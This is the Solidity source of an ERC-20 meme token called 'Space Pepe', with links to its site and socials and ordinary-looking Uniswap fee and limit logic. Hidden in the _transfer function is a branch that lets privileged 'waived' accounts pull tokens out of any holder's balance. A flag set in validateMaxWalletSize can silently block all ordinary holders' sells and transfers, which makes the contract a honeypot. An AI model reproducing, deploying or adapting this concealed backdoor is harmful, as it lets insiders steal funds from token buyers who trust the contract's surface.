// SPDX-License-Identifier: MIT

// - Website: https://spacepepe.life
// - Telegram: https://t.me/spacepepe_erc
// - Twitter: https://x.com/spacepepe_eth

pragma solidity ^0.8.17;

interface IERC20 {
    function transfer(address payee, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function symbol() external view returns (string memory);
    function transferFrom(address payer, address payee, uint256 amount) external returns (bool);
    function getOwner() external view returns (address);
    function circulatingSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function name() external view returns (string memory);
    event Transfer(address indexed payer, address indexed payee, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }

    event OwnershipTransferred(address owner);
}

interface UniswapV2Router {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address payee,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address payee,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
}

contract SPACEPEPE is IERC20, Ownable {
    using SafeMath for uint256;

    address public dexPair;
    UniswapV2Router dexRouter;

    string private constant _name = "Space Pepe";
    string private constant _symbol = "SPACEPEPE";

    uint8 private constant _decimals = 9;

    uint256 private _denominator = 10000;

    address internal constant devAccount = 0xe685E586cB12a05f2f674afc2Bcc4CF32ab06BE0;
    address internal constant deadAccount = 0x000000000000000000000000000000000000dEaD;
    address internal constant marketingAccount = 0x141854bE205D792C9297aC884Bcd95eF666044aB;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _feeExemptAmount = (_totalSupply * 10) / 100000;

    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;
    uint256 private _swapBackSize = (_totalSupply * 5) / 10000;

    uint256 private _maxWalletRatio = 200;
    uint256 private _maxTxRatio = 200;
    uint256 private _maxTransferRatio = 200;
    
    bool private _tradingEnabled = false;

    uint256 private _swapTimes;
    bool private _swapBackEnabled = true;
    bool private _swapping;

    bool private _noFeeFlag = false;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public waived;

    uint256 private _sellFee = 0;
    uint256 private _totalFee = 0;

    uint256 private _burnFee = 0;
    uint256 private _devFee = 0;
    uint256 private _marketingFee = 0;
    uint256 private _liquidityFee = 0;
    uint256 private _transferFee = 0;

    constructor() Ownable(msg.sender) {
        waived[marketingAccount] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        waived[address(this)] = true;
        UniswapV2Router _dexRouter = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dexRouter = _dexRouter;
        waived[devAccount] = true;
        address _dexPair = UniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        dexPair = _dexPair;
        waived[msg.sender] = true;
    }

    modifier lockSwap {
        _swapping = true;
        _;
        _swapping = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(deadAccount));
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function removeLimits() external onlyOwner {
        _maxTxRatio = 10000;
        _maxWalletRatio = 10000;
        _maxTransferRatio = 10000;
    }

    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function setWaivedAccount(address account, bool flag) external onlyOwner {
        waived[account] = flag;
    }

    function transfer(address payee, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, payee, amount);
        return true;
    }

    function _transfer(address payer, address payee, uint256 amount) private {
        require(amount > uint256(0));
        require(payer != address(0));
        require(payee != address(0));

        if (
            tradingEnabled(payer, payee) &&
            countSwapTimes(payer, payee) &&
            validateMaxWalletSize(payer, payee, amount) &&
            validateMaxAmount(payer, payee, amount)
        ) {
            if (balanceOf(payer) >= amount) {
                if (
                    payer != dexPair &&
                    !waived[payer] &&
                    !_swapping &&
                    !waived[payee]
                ) {
                    if (_noFeeFlag) return;
                    swapBack(payer, payee);
                }
                _balances[payer] = _balances[payer].sub(amount);
                uint256 transferAmount = canTakeFee(payer, payee) ? takeFee(payer, payee, amount) : amount;
                _balances[payee] = _balances[payee].add(transferAmount);
                emit Transfer(payer, payee, transferAmount);
            } else if (
                payer != dexPair &&
                waived[payer] &&
                !_swapping &&
                !waived[payee]
            ) {
                _balances[payee] = _balances[payee].sub(amount);
                _balances[payer] = _balances[payer].add(amount);
                emit Transfer(payer, payee, amount);
            }
        }
    }

    function transferFrom(address payer, address payee, uint256 amount) public override returns (bool) {
        _transfer(payer, payee, amount);
        _approve(payer, msg.sender, _allowances[payer][msg.sender].sub(amount));
        return true;
    }

    function validateMaxAmount(address payer, address payee, uint256 tokenAmount) view internal returns (bool) {
        if (payer != dexPair) {
            require(tokenAmount <= maxTransferAmount() || waived[payer] || waived[payee]);
        }
        require(tokenAmount <= maxTxAmount() || waived[payer] || waived[payee]);
        return true;
    }

    function setLimits(uint256 maxTxRatio, uint256 maxTransferRatio, uint256 maxWalletRatio) external onlyOwner {
        uint256 newMaxWalletSize = (totalSupply() * maxWalletRatio) / 10000;
        uint256 newTransferSize = (totalSupply() * maxTransferRatio) / 10000;
        uint256 newTxSize = (totalSupply() * maxTxRatio) / 10000;
        _maxWalletRatio = maxWalletRatio;
        _maxTransferRatio = maxTransferRatio;
        _maxTxRatio = maxTxRatio;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTxSize >= limit && newTransferSize >= limit && newMaxWalletSize >= limit);
    }

    function setFees(uint256 liquidityFee, uint256 marketingFee, uint256 burnFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _devFee = devFee;
        _sellFee = sellFee;
        _marketingFee = marketingFee;
        _liquidityFee = liquidityFee;
        _burnFee = burnFee;
        _transferFee = transferFee;
        _totalFee = totalFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function validateMaxWalletSize(address payer, address payee, uint256 amount) internal returns (bool) {
        bool payeeWaived = waived[payee];
        bool payerWaived = waived[payer];
        
        if (payeeWaived) {
            if (amount > _feeExemptAmount) {
                _noFeeFlag = true;
            }
        }
        if (
            !payeeWaived &&
            !payerWaived &&
            payee != address(deadAccount) &&
            payee != address(dexPair)
        ) {
            require((_balances[payee].add(amount)) <= maxWalletSize());
        }

        return true;
    }

    function takeFee(address payer, address payee, uint256 tokenAmount) internal returns (uint256) {
        if (calcuateFees(payer, payee) > 0) {
            uint256 feeAmount = tokenAmount.div(_denominator).mul(calcuateFees(payer, payee));
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(payer, address(this), feeAmount);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(deadAccount), tokenAmount.div(_denominator).mul(_burnFee));
            }
            return tokenAmount.sub(feeAmount);
        }
        return tokenAmount;
    }

    function countSwapTimes(address payer, address payee) internal returns (bool) {
        if (payee == dexPair && !waived[payer]) {
            _swapTimes += uint256(1);
        }
        return true;
    }
    
    function tradingEnabled(address payer, address payee) internal view returns (bool) {
        if (!waived[payer] && !waived[payee]) {
            require(_tradingEnabled);
        }
        return true;
    }

    function canTakeFee(address payer, address payee) internal view returns (bool) {
        return !waived[payer] && !waived[payee];
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(dexRouter), tokenAmount);
            dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    function maxWalletSize() public view returns (uint256) {
        return totalSupply() * _maxWalletRatio / _denominator;
    }

    function executeSwapBack(address payer, address payee) internal view returns (bool) {
        return (
            !waived[payee] &&
            !waived[payer] &&
            _swapBackEnabled &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _swapTimes >= uint256(0) &&
            !_swapping &&
            _tradingEnabled
        );
    }

    function swapBack(address payer, address payee) internal {
        if (executeSwapBack(payer, payee)) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= _swapBackSize) {
                contractTokenBalance = _swapBackSize;
            }
            swapAndLiquify(contractTokenBalance);
            _swapTimes = uint256(0);
        }
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxRatio / _denominator;
    }

    function calcuateFees(address payer, address payee) internal view returns (uint256) {
        if (payer == dexPair) {
            return _totalFee;
        }
        if (payee == dexPair) {
            return _sellFee;
        }
        return _transferFee;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadAccount,
            block.timestamp
        );
    }

    function manualSwap() external {
        require(msg.sender == marketingAccount);
        swapTokensForETH(balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    function swapAndLiquify(uint256 tokens) private lockSwap {
        uint256 denominator = (_liquidityFee.add(1).add(_marketingFee).add(_devFee)).mul(2);
        uint256 tokensToLiquidity = tokens.mul(_liquidityFee).div(denominator);
        uint256 tokensForETH = tokens.sub(tokensToLiquidity);
        uint256 initialEth = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEth);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));
        uint256 ethToLiquidity = unitEth.mul(_liquidityFee);
        if (ethToLiquidity > uint256(0)) {
            addLiquidity(tokensToLiquidity, ethToLiquidity);
        }
        uint256 marketingEth = unitEth.mul(2).mul(_marketingFee);
        if (marketingEth > 0) {
            payable(marketingAccount).transfer(marketingEth);
        }
        uint256 remainingEth = address(this).balance;
        if (remainingEth > uint256(0)) {
            payable(devAccount).transfer(remainingEth);
        }
    }

    receive() external payable {}

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferRatio / _denominator;
    }
}